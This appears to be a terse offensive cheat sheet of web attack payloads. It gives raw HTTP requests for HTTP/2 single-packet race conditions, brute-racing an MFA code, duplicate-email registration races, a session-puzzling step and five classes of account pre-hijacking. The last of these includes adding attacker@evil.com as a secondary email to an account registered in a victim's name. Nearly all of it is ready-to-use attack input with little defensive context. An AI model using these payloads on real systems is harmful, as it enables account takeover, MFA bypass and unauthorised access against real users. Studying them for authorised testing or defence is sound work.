## Single-Packet Race (HTTP/2 multiplexing)
# Send multiple streams in single TCP packet
# Use Turbo Intruder or custom Python with h2 library

## MFA Code Race
# Submit same valid MFA code 10+ times simultaneously
POST /verify-mfa HTTP/2
code=123456

## Registration Race (same email)
POST /register HTTP/2
email=target@example.com&password=Pass1!&username=user1

POST /register HTTP/2
email=target@example.com&password=Pass2!&username=user2

## Session Puzzling Payloads

# Step 2: Visit admin panel (reuses reset session state)
GET /admin

## Account Pre-Hijacking
# Class 1: Classic-Federated Merge
# Create account with target email, wait for SSO login
POST /register
email=victim@target.com&password=attacker123

# Class 2: Unexpired Session
# Create account, get session, don't log out
POST /register
email=victim@target.com&password=attacker123
# Save session cookie, wait for victim to reset password

# Class 3: Trojan Identifier
# Add attacker email as secondary to pre-created account
POST /settings/add-email
secondary_email=attacker@evil.com

# Class 4: Non-Verifying IdP
# Register on IdP with victim email (no verification)
# Then SSO into target app

# Class 5: Email Change
# Create account, start email change to victim email
# Don't complete verification
POST /settings/change-email
new_email=victim@target.com
